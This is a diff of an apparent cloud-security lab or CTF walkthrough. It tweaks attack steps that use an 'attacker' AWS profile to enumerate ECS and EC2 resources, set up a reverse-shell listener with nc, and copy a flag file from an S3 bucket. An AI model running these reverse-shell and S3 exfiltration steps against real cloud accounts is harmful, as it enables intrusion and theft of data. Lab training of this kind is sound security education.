@@ -23,10 +23,6 @@ Go to `http://<ec2_ip_address>`
 
 `aws --profile attacker ecs list-container-instances --cluster arn:aws:ecs:us-east-1:<aws_id>:cluster/<cluster>`
 
-`aws --profile attacker ecs describe-container-instances --cluster arn:aws:ecs:us-east-1:<user_id>:cluster/<cluster> --container-instances arn:aws:ecs:us-east-1:<aws-id>:container-instance/<cluster>/2d3ed51ad04847dd894dc78e263adfb3`
-
-`aws --profile attacker ec2 describe-instances --instance-ids <instance-id>`
-
 Attacker prepare revshell at other public ip point with `nc -lvp 4000`.
 
 And now come back to CLI.
@@ -48,8 +44,6 @@ Let's do it on revshell.
 
 `aws s3 ls s3://<bucket-name>/`
 
-`aws s3 ls s3://<bucket-name>/secret/`
-
-`aws s3 cp s3://<bucket-name>/secret/flag.txt .`
+`aws s3 cp s3://<bucket-name>/flag.txt .`
 
 `cat flag.txt`
